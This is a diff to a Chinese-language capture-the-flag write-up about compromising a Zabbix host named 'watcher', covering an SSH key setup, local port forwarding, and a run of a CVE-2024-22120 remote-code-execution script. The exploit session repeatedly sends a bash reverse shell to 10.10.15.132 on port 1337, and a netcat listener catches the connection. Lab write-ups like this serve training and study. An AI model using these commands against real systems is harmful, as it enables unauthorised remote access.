@@ -178,37 +178,6 @@ tcp   LISTEN 0      50     [::ffff:127.0.0.1]:9090             *:*
 ```
 #### 我们可以使用 ssh-keygen 创建一对 SSH 密钥，并执行本地端口转发以访问 8111 TCP 端口。
 ```
-zabbix@watcher:/$ cd /var/lib/zabbix
-zabbix@watcher:/var/lib/zabbix$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-zabbix@watcher:/var/lib/zabbix$ ssh-keygen
-Generating public/private rsa key pair.
-Enter file in which to save the key (/var/lib/zabbix/.ssh/id_rsa): Created
-Enter passphrase (empty for no passphrase): 123qwe
-Enter same passphrase again: 
-Your identification has been saved in Created
-Your public key has been saved in Created.pub
-The key fingerprint is:
-SHA256:W59rBlqwCgF5T3IJohk74yzeHgh0/+cgr/sc4BGqdxc zabbix@watcher.vl
-The key's randomart image is:
-+---[RSA 3072]----+
-|. .... .         |
-| =o.o +          |
-|*. + *           |
-|+o. + o .        |
-|oo . = ESo.      |
-|+ + o + ooo. .   |
-| + + = *.+ .o    |
-|  o o * *   o.   |
-|   . o++ . o.    |
-+----[SHA256]-----+
-zabbix@watcher:/var/lib/zabbix$
-zabbix@watcher:/var/lib/zabbix$ ls
-Created  Created.pub  user.txt
-Created directory '/var/lib/zabbix/.ssh'.
-```
-
-_______________
-```
 [★]$ nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.10.15.132] from (UNKNOWN) [10.129.16.76] 43150
@@ -289,14 +258,15 @@ zabbix@watcher:/var/lib/zabbix/.ssh$
 [★]$ chmod 600 id_rsa
 [★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
 ```
-### 也就试了这么多遍
+________________________________________
+### 也就试了这么多遍 13遍
 ```
 [★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid f0e74fc76835e10384a16a84691d7a6d --hostid 10084
 (!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
 [zabbix_cmd]>>:  whoami
 zabbix
 
-[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
 Cannot read the response, check connection with the Zabbix server "localhost".
 [zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
 Cannot read the response, check connection with the Zabbix server "localhost".
